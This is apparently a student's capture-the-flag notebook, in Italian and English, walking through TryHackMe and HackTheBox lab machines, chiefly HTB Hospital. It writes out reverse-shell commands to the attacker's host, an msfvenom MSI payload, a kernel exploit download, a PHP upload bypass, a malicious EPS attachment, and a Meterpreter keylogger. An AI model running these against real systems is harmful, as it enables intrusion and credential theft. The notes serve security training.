### Loggin in Samba as a guest user:

![[1b4558bv.bmp]]


---

> smbclient  --no-pass -L $ip

Troviamo directory condivise, ci entriamo con il seguente comando:

> smbclient --no-pass //$ip/datasci-team

e le esploriamo con "dir" o "ls"

![[Pasted image 20240304173836.png]]

In questo caso troviamo un'altra directory utile che sarebbe "misc" e da li troveremo il token di jupyter da mettere nel sito web:

![[0h8c40yt.bmp]]

prendere e visualizzare i file:

> get jupyter-token.txt -> cat  jupyter-token.txt

### inserire il token:

![[Pasted image 20240304174443.png]]

![[Pasted image 20240304174358.png]]

these files are the same ones that we found on samba. There is however a new button which has a terminal option which is promising. Let’s take a look at it.

Dopo il log-in, non abbiamo bisogno (in questo caso) di visualizzare i file all'interno dell'account di jupyter, ma apriamo direttamente il terminale:

![[Pasted image 20240304174702.png]]


![[oj2ai4p5.bmp]]

> whoami -> pwd -> ls 

I’ve been able to find out that we’re a user called dev-datasci in its home directory and there is a interesting file called dev-datasci-lowpriv_id_ed25519. This tells me that there could be a user somewhere on this system that is called dev-datasci-lowpriv. If we cat this file we see that it is a private openssh key. We will therefore save it on our machine, give it 700 privileges and try to login with this key using ssh as user dev-datasci-lowpriv.

Troviamo la chiave privata dell'user con i privilegi abbasati:

>cat dev-datasci-lowpriv

![[Pasted image 20240304175951.png]]

"the first thing in your head is when you find a private key is **can i use it?**"

Quindi: -> crea un file -> mettici la chiave privata dentro(salva ed esci dal file) -> fai il sign-in con ssh.

Esempio:

> vim chiave

![[Pasted image 20240304180335.png]]

> :wq

dai i privilegi al file con la chiave privata se no, non ti permetterà di eseguire il comando:

> chmod 700 chiave

log-in:

composto da: ssh -i {file name} {user}@$ip_of_the_victim

> ssh -i chiave dev-datasci-lowpriv@$targetip

![[Pasted image 20240304180718.png]]

> yes

We should be inside of the windows system:

![[Pasted image 20240304180834.png]]
 
For privilege escalation on windows there are a few tools we can use. First one is winpeas and the second one is privesccheck. I’ll use privescchek because I already have this one on my machine and you can find it [here](https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1).

So this requires some steps now. First we need to save this file to our machine. Check. Next we need to run a python http server on our machine with<mark style="background: #CACFD9A6;"> python3 -m http.server 8000</mark>, in order to do the second step which is getting this file on the target machine. To get this script on the target machine we will use curl

#### transfering file to the target machine

> new tab

> wget https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1

> python -m http.server

![[Pasted image 20240304182931.png]]

-> return to the target system

> curl http://$your_machine_ip:8000/PrivescCheck.ps1 --output PrivescCheck.ps1


![[Pasted image 20240304183244.png]]

### Escalate:

Execute the process for installation PrivsecCheck:

![[Pasted image 20240304183913.png]]

-> Execute these command on the target windows machine after you verified the installation of it.

![[Pasted image 20240304184352.png]]

![[l6xi35kn.bmp]]

Well as we see in the report that we got there are some credentials

![[shrsoaqn.bmp]]

![[Pasted image 20240304185221.png]]

and also AlwaysInstallElevated is on. I found this [blog](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path) post on the latter. It says that AlwaysInstallElevated allows all users to instal msi files with elevated privileges. First we need to check to things in order to know if we can make a custom msi payload.

![[Pasted image 20240304185138.png]]



-> new terminal 

> msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=$your_IP LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi

-> create listener on port setted (1337)

> nc -lvnp 1337

Now let’s start again a python http server and get that msi file on the target machine with curl again.

Example: 

![[Pasted image 20240304190439.png]]

![[81q2bd8d.bmp]]

After a lot of googling on how to run this, I found out that we didn’t have credentials for nothing. We need to use **runas** to run the installation as the user we are currently logged in. 

Command:

> runas /user:dev-datasci-lowpriv "msiexec /i C:\\Users\\dev-datasci-lowpriv\\Downloads\\shell.msi /qn"

or   

> runas /user:dev-datasci-lowpriv "msiexec /i C:\\Users\\dev-datasci-lowpriv\\Desktop\\shell.msi /qn"



-> insert the password we found in the scan before
This one:
![[Pasted image 20240304191133.png]]

And there we go, we have the session open on netcat! search for the root flag:

![[7yrqresr.bmp]]

![[1u0tveor.bmp]]


---

## THM Biteme

Room: https://tryhackme.com/r/room/biteme (Bruteforcing MFA & Fail2ban Manipulation)

Video resorce: https://www.youtube.com/watch?v=vAlkrw-o7m4



---


# THM WindowsPrivSec

https://tryhackme.com/room/windows10privesc

---

# THM LinuxPrivSec

https://tryhackme.com/r/room/linprivesc

---

## UPDATED THM WindowsPrivSec --Pagato

[https://tryhackme.com/room/windowsprivesc20](https://tryhackme.com/room/windowsprivesc20)

articolo: 

video: https://www.youtube.com/watch?v=k_99-dXtdpc

---

## CTF COLLECTION VOLUME ONE

https://tryhackme.com/r/room/ctfcollectionvol1

vol: 2

[TryHackMe | CTF collection Vol.2](https://tryhackme.com/r/room/ctfcollectionvol2)

vol: 3



video: https://www.youtube.com/watch?v=gqnmNDYT1DI

---

Forensics?

https://www.youtube.com/watch?v=uPCAv42WHT4

---

## ctf Hospital

video: [HackTheBox - Hospital (youtube.com)](https://www.youtube.com/watch?v=E8h0qWsBz6c)

Scan:

![[Pasted image 20240502184046.png]]

Result:

![[Pasted image 20240502184424.png]]

We can at least add this  host domain to our host file:

![[Pasted image 20240502184445.png]]

![[Pasted image 20240502184755.png]]

> sudo vi /etc/hosts

![[Pasted image 20240502184840.png]]

This port is telling us is running as windows64 and has PHP enabled.

And we can even see that in port 8080 is running ubuntu? So we could assume is both ubuntu and windows?

Analyze TTL on a network connection:

The easy way to discover the OS is by the TTL (Time To Live)

ping target:

![[Pasted image 20240502185441.png]]
TTL default for windows is 128 so we discovered that is a Windows system. (in this case it says "127" because there is a VPN server between the client and the windows box.)

And A Linux system could have a TTL of 64:

![[Pasted image 20240502185351.png]]



> sudo tcpdump -i tun0 -v -n ip src 10.10.11.241

Explained: "-v" to show the TTL by deafult. "-n" hide DNS and we're intercepting the ip exactly of that guy to avoid confusion.


Analyzing TTL via netcat:

![[Pasted image 20240502190222.png]]

**Note:** The "22" is the port number.

![[Pasted image 20240502190332.png]]

the default TTL of linux is 64, so it hoped by two, probably by a router runned by Hyperv and your VPN server.

By trying to identify the server with:

> http://$ip:8080

![[Pasted image 20240502190639.png]]
mi sono fermato a 6:21

By trying to log-in as "admin" we can see that the admin user is there.

![[Pasted image 20240502213428.png]]

Anyways.. by loggin-in as a normal user, we can see that we can upload a file and the application is running php, we see it from the search bar:

![[Pasted image 20240502213612.png]]

So we will try to upload a file and intercept the request of it:

> locate png -> choose a random image

then ensure you did this command with "." or will give an error:
![[Pasted image 20240502213902.png]]

put interception on:

![[Pasted image 20240502214025.png]]

Upload that:

In this case we will upload this file:

![[Pasted image 20240502214941.png]]

(a random one)

![[Pasted image 20240502214000.png]]

## Attacking the PHP image Upload Form:

Forward the requests and send it to repeater: 

![[Pasted image 20240502214548.png]]


![[Pasted image 20240502214348.png]]

Now we don't see where the upload is stored.. so we try guessing the directory, by typing "uploads" on the search bar it appears this error:

![[Pasted image 20240502214715.png]]
"Forbitten" This means that the directory exist, because if we try to search for a directory that dosen't exist it should appear "Not Found"

Since we know "uploads" exist, we can presume that the image is stored in "uploads" + your image name and in our case is "button.png"

![[Pasted image 20240502215122.png]]

Now if we try to change the exstension of the file image from png to php we get this:

![[Pasted image 20240502220056.png]]

The files get to "failed.php" even if we try to upload a "buttons.php3" or 
"buttons.php5" we get a fail:


![[Pasted image 20240502220426.png]]
 
but if we try to increase that number we get a success:

![[Pasted image 20240502215255.png]]

This happens because there is a blacklist and we bypassed that by putting an unknow exstension.

We can do the same thing with FuFF

So copy the file:

And re-name it like "upload.req"

![[Pasted image 20240502221917.png]]

> vi uploads.req

change filename="buttons.php" to filename="buttons.FUZZ" and exit from uploads.req

![[Pasted image 20240502222115.png]]

Now we make this command and search for a wordlists file we want to use (that at least contains php4 extensions ecc.....)
![[Pasted image 20240502223232.png]]
you can download these wordlists if you want:

![[Pasted image 20240502222505.png]]

And we finish the command:

![[Pasted image 20240502224210.png]]

**Note:** "-mr success" is just the command to tell to show  just the request that has that response:

Now unfortunately the attack didn't go well since none of them gave us a response of "success":

![[Pasted image 20240502224724.png]]

## Uploading a php shell discovering there are disabling functions blocking the system:


delete all binary data:

![[Pasted image 20240502224119.png]]

Now this should be the file we should have:

![[Pasted image 20240502230102.png]]

before getting to the actual working payload i tryed a few attempts and failed, wich are:

So first i added a command injection command and change the exstension file to "phtm" which it could work against php
![[Pasted image 20240502231015.png]]

Then i re-named the url from "buttons.php" to "buttons.phtm" but didn't get a response from the system:

![[Pasted image 20240502231137.png]]

So i tryed to change the exstension to a more unknow one, it might not be in the blacklist, plus i uploaded a new file, cause the response gave a "success" response but didn't get anything interesting:

![[Pasted image 20240502231334.png]]

![[Pasted image 20240502231413.png]]

But it was very odd.. since i wasn't get a file, so it might be something blocking my script

![[Pasted image 20240502231634.png]]

So i tryed to change it and make a test, decided to make a echo response:

i changed the payload to:

![[Pasted image 20240502231725.png]]
And it outputs it, so we HAVE code execution:

![[Pasted image 20240502231554.png]]


So i  try to do a "phpinfo" payload to try and get a right response:

![[Pasted image 20240502225926.png]]

**Note:** remember to turn the intercept off to make the page load:

And i got the response:

![[Pasted image 20240502232000.png]]

And from what we can see... they have disabled lots of functions, this is why the system command failed.

![[Pasted image 20240502232049.png]]

But we can look for any function that is dangerous but isn't disabled:

So i tryed to look for a single file php that automatically bypasses many thinks for you, like for PHP it could be p0wny shell on github

### Using dfunc Bypass to identify proc_open is not disabled and then getting code execution

But if we search on IppSec Website, we can search for "php disable" and then see the video he did:

![[Pasted image 20240505111436.png]]

So an example  by doing what ippSec did 


So we search for dfunc on github and we should find this page:

![[Pasted image 20240505113304.png]]

( The downside of this is it has to use python2 but we convert it to PHP)


The way this script is to be run is that you grab all the disabled functions from PHP, copy and paste it into the python and then work it that way:


![[Pasted image 20240505112949.png]]

Copy the dangerous functions:

![[Pasted image 20240505113101.png]]

create a file:

> vi dangerous.php

make a array with a list of all dangerous functions for PHP:


![[Pasted image 20240505110639.png]]
And then we do a loop with a "if" that views if the function exists it tells that exists:

![[Pasted image 20240505114417.png]]

-> save and exit with ":wq" command.



full file view:

![[Pasted image 20240505114129.png]]

Put it on burpsuite:

![[Pasted image 20240505114258.png]]

![[Pasted image 20240505114321.png]]

Then press "ENTER" or just press send:

And in the response we have a few:

![[Pasted image 20240505114633.png]]

We will try to exploit **popen** because is probably the easiest one:

Just search how to run it:

![[Pasted image 20240505114748.png]]

L'ets grab this example:

![[Pasted image 20240505115417.png]]

 delete the previous code and replace it with this one:

So here we have the script and we have to just modify the path to find the system files:

![[Pasted image 20240505115603.png]]

Like to full path:  change it to "ls /"     (you could do even "/bin/ls")

![[Pasted image 20240505115835.png]]

And from what we can see it works!

![[Pasted image 20240505115914.png]]


But now we want to get a reverse shell:

![[Pasted image 20240505120115.png]]

The Bash script is: 

> 'bash -c "bash -i >& /dev/tcp/$yourIP/$yourPort 0>&1"'

(and remember to modify the "2>&1" to "0>&1"

see how IpSec did it: https://youtu.be/E8h0qWsBz6c?t=1304

Activate listener:

> nc -lvnp $yourPORT

and send the request on burpsuite, we should have the web shell:

### Reverse shell returned on the linux host

![[Pasted image 20240505120029.png]]

Now l'ets upgrade the shell to be a proper PTY:

> python3 -c 'import pty;pty.spawn("/bin/bash ")'          -> CTRL + Z

> stty raw -echo;fg

![[Pasted image 20240505143710.png]]

usefull resource? [Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
and ![[Pasted image 20240505144221.png]]

Now the first thing we would like looking is for databases

![[Pasted image 20240505144340.png]]

we will go to config.php

> cat config.php

view creds:

![[Pasted image 20240505144727.png]]

so the username is root and the password my$qls3rvlc3!

**log in:** mysql -u root -p    -> insert passwd

![[Pasted image 20240505145451.png]]

![[Pasted image 20240505145525.png]]
Copy the hash:

![[Pasted image 20240505145620.png]]

-> make a new terminal and create a new file

> vi hashes.8080

![[Pasted image 20240505145754.png]]

-> exit from the file

l'ets attempt to crack these:

> ssh kracken    (maybe you need to install the  GitKraken to make it work? source: [GitKraken Client: Getting Started - DEV Community](https://dev.to/pratik_kale/gitkraken-client-getting-started-25mi#:~:text=To%20get%20started%20with%20GitKraken%2C%20follow%20these%20steps,follow%20the%20on-screen%20instructions%20to%20complete%20the%20installation.))

navigate to  to hashcat then to the hashes and create the file "hospital.8080"

![[Pasted image 20240505150036.png]]

put the hashes and exit:

![[Pasted image 20240505151049.png]]

> cd ../

and then we TRY to bruteforce it, use the command:

> ./hashcat.bin --user hashes/hospital.8080 /opt/wordlist/rockyou.txt -m 3200

![[Pasted image 20240505151407.png]]

Wait for the crack...

![[Pasted image 20240505151834.png]]

And we found that the two passwords are "123456" and "patient"


### Uname shows a really old kernel, then doing CVE-2024-1086 which is a NetFilter exploit

Now by enumerating the system we find out that the kernel version is old.

![[Pasted image 20240505152802.png]]

i tryed to google for that specific kernel but isn't coming up:

![[Pasted image 20240505152909.png]]

So i just tryed to search in a more generic method:

![[Pasted image 20240505153016.png]]

And i found this exploit that should work:

![[Pasted image 20240505153102.png]]

it says it works "between version v.5.14 and v.6.6"

So let's try this exploit, Go to release page and copy the payload:

![[Pasted image 20240505153350.png]]

then into the terminal:

> mkdir www -> cd www -> wget $link_copied

![[Pasted image 20240505153733.png]]

> python3 -m http.server  (should be listen on port 8000)


-> return to the previous terminal (where you are inside the system) and run the following command:

> cd /dev/shm -> wget $yourip:$pythonserverPORT/exploit

![[Pasted image 20240505154103.png]]

add execute permission to the file:

> chmod +x ./exploit

###  Verify if the exploit works and if is stable:

> ./exploit

And we're root:

![[Pasted image 20240505154451.png]]

Now as root what we can do? Well firslty get the shadows files:

> cat /etc/shadow

![[Pasted image 20240505154846.png]]

But we only want the hashes  with the '$' because are from PHP:

So we grep all the hashes in that file that has the "$":

> cat /etc/shadow | grep '\\$'

We found two.. but one has a strange hash encryption.. so it might not supported for hashcat:

![[Pasted image 20240505155541.png]]

So just copy it and save it to a file:

> vi hashes/hospital.shadow -> put the hash and save.

and crack it:

![[Pasted image 20240505160442.png]]

output:

![[Pasted image 20240505162048.png]]

password: ==qwe123!@#==

Before we dive further... let's talk about how to recognize encryption:

### Talking about Man Pages and how they are organized to identify $y$ is yescrypt

Now if you want to see what encryption are relative, use "man" you could use google but goole took longer to find, rather than just using man pages.

> man crypt

![[Pasted image 20240505160810.png]]

from here it says "hashing method are described in crypt(5)"

crypt 5 is where are described the file and formats convetions of the command, that's just a setting of man

You can see the description of the hashes by doing:

> man 5 crypt

output:   it tells the crypting method & name and how to recognize them.
![[Pasted image 20240505161508.png]]

![[Pasted image 20240505161618.png]]

and by doing "man man" command we can see that the catalog "5" is for file formats and convetions like we said before, so that's why all the hashing convetions would be in page 5 of crypt

![[Pasted image 20240505160904.png]]

So anyways this is a great way to familiriaze yourself with exactly how hashing works.

Now returning to the password we have cracked before, "qwe123!@" l'ets connect to the target machine:

![[Pasted image 20240513192024.png]]

or

![[Pasted image 20240513192248.png]]

other tools you could try: (you view all off them using netexec --help)

![[Pasted image 20240513192450.png]]

Just modify the protocol type and the rest is exactly equal:

> netexec winrm $targetIp -u $user -p $paswd

### Logging into RoundCube, discovering an email that indicates that drwilliams runs GhostScript with EPS Files, looking for exploit

but in this case it dosen't work... so let's try to return back to the website and log-in with  drwilliams credentials: the password is qwe123!@#

![[Pasted image 20240513192846.png]]

and we should successfully log-in: 

![[Pasted image 20240513193034.png]]


> [!description] From here we can see that he wants a "eps" file that can be visualized with GhostScript





 L'ets search for an exploit about it:

to see if there is anyway to send them a malicious attachment:


![[Pasted image 20240513193225.png]]

From the first link, we can see that we have a CVE to create a malicious file in eps

![[Pasted image 20240513193909.png]]

Just follow the instruction on how they did it, and change the ip of your machine and the port of the listerner:

![[Pasted image 20240513194507.png]]

![[Pasted image 20240513194119.png]]
But we have a problem... by analyzing the file we see that the reverse shell isn't in windows but only in linux:

![[Pasted image 20240513194303.png]]

So we try to create a one liner listener that does remote code  execution:

-> cd www

![[Pasted image 20240513195021.png]]

And change the ip to yours aslong with the port:

![[Pasted image 20240513195728.png]]

**Tip:** We mostly want to create a web server thatexecutes the payload, because if i just encoded this and send it to the server and antivirus picked up, i wouldn't know if my code execution worked.
So if i do a Web creadle that reaches back to me to download the payload, antivirus is not going to trigger that often because when making an HTTP request that validates the RCE and if i don't get a shell, the probably the AV blocked my payload.

-> python3 -m http.server 

Now we need to create a one liner to execute that:

Copy the code in the bottom and then encode it in UTF16 since windows likes things in **utf 16 little endian** (normal to avoid quotes issues we would just base64 encoding it)

![[Pasted image 20240513195900.png]]

encode it in UTF16 little endian: ("-t" stands for target.)

![[Pasted image 20240513202820.png]]

And all that it does is encrypting the code by adding nulls ("0")

viewing the encrypting in xxd:

![[Pasted image 20240513203435.png]]

And it just puts nullbyte afterwords:

![[Pasted image 20240513204437.png]]

however if you want to do it in base64 just do "base64 -w 0" but in this case, we add UTF16LE encryption and base64: (we do this to add powershell in command)

![[Pasted image 20240513204802.png]]

Just copy the code to put in your web cradle server:

![[Pasted image 20240513204921.png]]

Now we generate the malicious payload by simply following the instruction on the CVE:

![[Pasted image 20240513205616.png]]

Move that to back directory to stay a little organized:

![[Pasted image 20240513205713.png]]

View the file to ensure the payload is here:

> less shell.eps

-> nc -lnvp 9001

and then simply reply to him and attach the file:

![[Pasted image 20240513205919.png]]

attach file:

![[Pasted image 20240513205953.png]]

-> send

And now what we want to do is wait for the HTTP request to come and see for the reverse shell:

![[Pasted image 20240513210049.png]]

output connection:

![[Pasted image 20240513210241.png]]

### PRIVESC 1: Uploading a shell in XAMPP and getting system


So now we are drbrown in powershell, now there are two ways to get to root from here: The first one is the unintended because is so much quicker, so to show: ...

From what we know, back at the nmap scan, on  443 port we knew Apache was listening on a windows aswell
![[Pasted image 20240513232103.png]]

And the Apache we exploited initially was on Ubuntu:

![[Pasted image 20240513232222.png]]

So we know the windows server did have a web server.

_return to the remote shell_

-> dir 

![[Pasted image 20240513232340.png]]

-> cd xampp (this is how Apache is installed on windows) -> cd htdocs

Now we try to make a shell:

-> Script + "file name" (shell.php)
![[Pasted image 20240513233328.png]]

but... it dosen't work if we just browse on it

![[Pasted image 20240513233558.png]]

So let's try to intercept the request and send it to repeater

The payload looks fine, but what if we go over to Hex?


![[Pasted image 20240513233637.png]]

And we're seeing is UTF16LE encoded by the zeros

![[Pasted image 20240513233718.png]]

And is failing because when we're viewing the payload we insert, it says  that a part of the code is UTF8 encoded but the rest is in UTF16LE encoded
![[Pasted image 20240513233857.png]]

So to fix that, on the PS we write the following payload to transformate everything in UTF8 encoded encryption:

![[Pasted image 20240513234125.png]]

Now after updating the payload we re-send the request and it should work:

![[Pasted image 20240513234243.png]]

![[Pasted image 20240513234336.png]]

It says we're system user, so there is no UTF16LE encoding and by that we have a shell.

Well now all we have to do here is change the payload, since we have RCE we simply request for a terminal (we request only for a cmd because we're already system users)

Update payload shell.php in PS:

![[Pasted image 20240513235206.png]]

And now simply add "cmd=whoami" in the request method to talk with the cmd and see if it is actually vulnerable:


And the response should be right:

![[Pasted image 20240513235620.png]]

And now that we add the reverse shell in our favor into the cmd

-> return and catch again the CVE we used before:

-> cp payload

![[Pasted image 20240514000051.png]]

listener:

-> nc -lvnp 9001

add in the request:  cmd=powershell.exe + "payload in utf16LE & base64" then after you put the payload, use Keyboard shortcut of Ctrl+U or Ctrl+Shift+U to URL encode  the payload parameter and you should have the reverse shell

You might have issue by not encoding the payload in URL encoded method:

![[Pasted image 20240514001002.png]]

! Url encoding adds like "%20" bytes:

![[Pasted image 20240514001509.png]]


![[Pasted image 20240514000641.png]]

Now simply navigate through the directoryes:

![[Pasted image 20240514001708.png]]


And we get the flag we wanted to:

![[Pasted image 20240514001631.png]]

### PRIVESC 2: Discovering an active session, using meterpreter to get a keylogger running and stealing the password [intended way]

by doing: 

> get-process

we can see some  process in the system that has "1" which indicates interactive log-in, like powershel, iex-explore etc...:

![[Pasted image 20240607195212.png]]

and by doing "qwinsta" or "query user" we can see that we are "0"
 it means we have no active remote desktop session open. which drbrown  has "1"  he has a active session
![[Pasted image 20240607200156.png]]

So the easiest way to look at what drbrown is doing is  through metasploit because we have to inject ourself into another process and process injection in powershell is just hard.

Which in this case, the payload is going to be this (do it into another terminal): 


![[Pasted image 20240607201629.png]]
"-f EXE" stands for file with the format .exe and "-o msf.exe" is output file as msf.exe

to ensure it worked see for the file msf.exe:

![[Pasted image 20240607202242.png]]

Activate  a reverse shell for when the user  will open it:

> msfconsole

> use exploit/multi/handler


![[Pasted image 20240607202036.png]]

upload the file:

-> mv msf.exe www/

-> cd www

-> python3 -m http.server

Now we return to the user shell and extract the file:

-> cd programdata

-> wget http://$ourIP:8000/msf.exe -o msf.exe

![[Pasted image 20240607203029.png]]

**Tip:** look closely for the server that got a response like this, so you know you're listening the server with the file msf.exe or else, you will receive a "file not found" error.
![[Pasted image 20240607203849.png]]

now it should be there, and you finally execute the file by doing: ".\\msf.exe" as the user and the reverse shell should have been activated:

output from where we should be:

![[Pasted image 20240607204157.png]]


now we simply want to migrate the shell into some program that is "interactive" as RDP on the user, so "1".

> ps

![[Pasted image 20240607204328.png]]

![[Pasted image 20240607204559.png]]

#### start using meterpreter commands

> keyscan_start

![[Pasted image 20240608005338.png]]


## While we are waiting for keys to be typed, lets inject a Reverse VNC Server so we can watch the screen


background the meterpreter:

> "bg"      or "background"

we will try this VNC payload:

on metasploit:

> use exploit/windows/local/payload_inject

set the payload that you can see below:

![[Pasted image 20240608012324.png]]

> show options

> set LHOST tun0

> set session 1 (the session you have active)

> set PID 2288 -> run

In this case it failes the attack cause we don't have the vncviewer pack installed:

![[Pasted image 20240608012538.png]]

try searching with:

> sudo apt search vncviewer

then try installing and use:

> sudo apt install xtightvncviewer

Now try to re-run the metasploit command:
![[Pasted image 20240608012902.png]]

a pop up of vncviewer should pop-up, if it dosen't then try this other command:

> vncviewer

it will ask you about the ip and the port in wich he should connect, wich in this case is:

> 127.0.0.1:5900

![[Pasted image 20240608013105.png]]

and a pop-up should come up! we should be able to see the desktop of the target:

![[Pasted image 20240608013516.png]]

however, now you should be able to make the keys and dumb the data on the first meterpreter session?

![[Pasted image 20240608013742.png]]

Now copy the last part of the password of the code:

![[Pasted image 20240608014102.png]]

and you should be able to log-in into the target machine RDP with this command:

> netexec smb *$targetIp$ -u administrator -p '$passwd'

![[Pasted image 20240608014153.png]]

Or you can simply do it with psexec, wich you can find the repository of it [here](pypsexec · PyPI](https://pypi.org/project/pypsexec/)

example of success:

![[Pasted image 20240608014627.png]]

Or you could simply log-in through VNC:

![[Pasted image 20240608014839.png]]


Same with xfreerdp:  (and the password is 'chr!$br0wn')

![[Pasted image 20240608015405.png]]

log-in with this command:

> xfreerdp /v:$targetIP /u:drbrown /admin 

("/admin" gives you a console session wich permits you to view passwords on log-in tabs)

![[Pasted image 20240608015531.png]]

output:

![[Pasted image 20240608015817.png]]

_finished 08/06/2024_

---

Prossimo da fare dopo HTB Hospital:

molto breve 15 min: [HackTheBox - Sau (youtube.com)](https://www.youtube.com/watch?v=H6QfYGeGdGQ)

breve 30 mins https://www.youtube.com/watch?v=VcxSqLEr3kY e https://www.youtube.com/watch?v=okTl6kWrncg

[HackTheBox - Sandworm (youtube.com)](https://www.youtube.com/watch?v=RD58QpRu7u4)

---
## Cheese THM:

https://www.youtube.com/watch?v=6BzbmwHn10Y



---
## CTF Steel mountain:

resources: [THM: Steel Mountain | by Yogasatriautama - Freedium](https://freedium.cfd/https://medium.com/@yogasatriautama/thm-steel-mountain-ddf48bc7e9da)

>*Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.*

---

## CTF HTB - VALENTINE (EASY):

_SSL/TLS enumeration_
<iframe width="928" height="522" src="https://www.youtube.com/embed/tay79d_lN8E" title="HTB Valentine Walkthrough (Easy Linux)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

## CTF Linux Basics:

[kioptrix-level-2 | Vulnhub | Linux | Basic machines (youtube.com)](https://www.youtube.com/watch?v=_6op2qJYKkU&list=PLZl1nkvsEL2WpfIXoCSiY6-HJsWotXpIb)

---

### CTF Steganography?

https://www.youtube.com/watch?v=sChN6o06jDM john hammond 1/2

---

### CTF OWASPTop10

[TryHackMe | OWASP Top 10](https://tryhackme.com/r/room/owasptop10)

---

## CTF THM Throwback

Part 1: [TryHackMe - Throwback - Attacking Windows Active Directory || Part One (youtube.com)](https://www.youtube.com/watch?v=mQT38VR4boQ&t=3s)

Part 2: [TryHackMe - Throwback FINALE - Attacking Windows Active Directory (youtube.com)](https://www.youtube.com/watch?v=ukFC48bzVSM&t=10s)

---

[Hack The Box — Intelligence Walkthrough | by Wayne.H | May, 2024 | Medium](https://medium.com/@huwanyu94/hack-the-box-intelligence-walkthrough-3b6a2b177a67)


----


[HackTheBox - Response - YouTube](https://www.youtube.com/watch?v=-t1UAvTxB94)

Example writeup [HTB: Response | 0xdf hacks stuff](https://0xdf.gitlab.io/2023/02/04/htb-response.html)

- insane difficulty 3 hours long
---

[THM: Linux Agency. This Room will help you to sharpen your… | by Yogasatriautama | Jun, 2024 | Medium](https://medium.com/@yogasatriautama/thm-linux-agency-4cdf622054ce) -- short

---

Manual Pentesting Exploitation: Step-by-Step Guide for Hackers

[Manual Pentesting Exploitation: Step-by-Step Guide for Hackers - YouTube](https://www.youtube.com/watch?v=N-d5Fkz9Wu4)

---

## Mailing H.T.B CTF

[HTB: Delivery | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/05/22/htb-delivery.html#shell-as-maildeliverer)

[Mailing Writeup | Local File Inclusion & Pass The Hash | by Onurcan Genç | May, 2024 | Medium](https://medium.com/@onurcangencbilkent/mailing-writeup-local-file-inclusion-pass-the-hash-cd1a430e40bf)


---

## THM Advanced SQLi

[TryHackMe | Advanced SQL Injection | WriteUp | by Axoloth | Jun, 2024 | Medium](https://medium.com/@axoloth/tryhackme-advanced-sql-injection-writeup-e8a961589b8b)



https://infosecwriteups.com/vulnhub-backdoored-writeup-032475f760dc


----

## THM HackPark

https://medium.com/@yogasatriautama/thm-hackpark-2ce86d615738


----

https://medium.com/@embossdotar/tryhackme-advanced-static-analysis-writeup-67957dddc0cc?source=read_next_recirc-----8a4b1a9ca004----2---------------------90f75554_df30_4114_841f_3699e6c7f4f6-------


## Basic Static Analysis:

https://mdamiruddin.medium.com/basic-static-analysis-tryhackme-writeup-walkthrough-by-md-amiruddin-52d1b5b46663


----

PyRat  THM:

<iframe width="928" height="522" src="https://www.youtube.com/embed/36czawojezg" title="Pyrat || Detailed Walkthrough - (TryHackMe!)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

----

<iframe width="928" height="522" src="https://www.youtube.com/embed/-2a775NQiC4" title="🔥 [HTB] Late Night Hacking - 29/10/2024 [ITA] 💀" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---


https://youtu.be/NT0Cf86Q94s


<iframe width="1012" height="561" src="https://www.youtube.com/embed/NT0Cf86Q94s" title="10 DAYS TILL OSCP | Hacking HTB Haircut and Rebound Pt. 1 | Learnin to Hack" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


---